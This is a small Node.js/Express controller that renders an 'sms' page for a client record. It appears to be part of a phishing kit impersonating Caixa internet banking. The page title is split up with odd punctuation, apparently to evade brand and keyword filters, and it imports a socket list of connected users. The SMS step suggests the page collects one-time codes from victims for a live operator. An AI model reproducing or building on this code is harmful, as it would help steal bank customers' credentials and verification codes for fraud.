const Client = require('../../models/Client')
const { clientsSocket, connectedUsers } = require('../../server')

module.exports = {
    async view(req, res) {
        try {
            //Client

            const { client, error } = req.query

            const theClient = await Client.findByPk(client)

            return res.render('sms', {
                title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
                pageClasses: 'password cadastro',
                client: theClient.toJSON(),
                sms: true,
                error: error ? true : false,
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
